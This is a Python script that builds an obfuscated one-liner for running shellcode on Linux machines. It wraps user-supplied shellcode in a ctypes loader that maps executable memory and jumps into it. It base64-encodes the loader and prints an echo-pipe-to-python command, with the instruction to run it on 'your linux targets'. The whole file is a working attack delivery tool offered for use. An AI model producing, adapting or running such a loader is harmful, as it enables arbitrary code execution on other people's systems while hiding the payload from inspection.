#!/usr/bin/env python3

'''
generate a one liner for python based shellcode delivery
'''

import base64
import sys

try:
    shellcode_txt = sys.argv[1]
except IndexError:
    print(f"usage: {sys.argv[0]} <shellcode file>")
    sys.exit(1)

try:
    shellcode = open(shellcode_txt).read().strip()
except FileNotFoundError:
    print(f"put your shellcode in {shellcode_txt}")
    sys.exit(1)

template = f'''
#!/usr/bin/python2

import ctypes
import sys
from ctypes.util import find_library

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0X02
MAP_ANONYMOUS = 0X20
ENOMEM = -1

SHELLCODE = "{shellcode}"

libc = ctypes.CDLL(find_library('c'))

mmap = libc.mmap
mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                 ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
mmap.restype = ctypes.c_void_p

page_size = ctypes.pythonapi.getpagesize()
sc_size = len(SHELLCODE)
mem_size = page_size * (1 + sc_size/page_size)

cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE |
            PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
            -1, 0)

if cptr == ENOMEM:
    sys.exit("mmap")

if sc_size <= mem_size:
    ctypes.memmove(cptr, SHELLCODE, sc_size)
    sc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
    call_sc = ctypes.cast(cptr, sc)
    call_sc(None)
'''

payload = base64.b64encode(template.encode("utf-8"))
print(f'''echo "exec('{payload.decode('utf-8')}'.decode('base64'))"|python''')

print("\n\nRun this one liner on your linux targets")
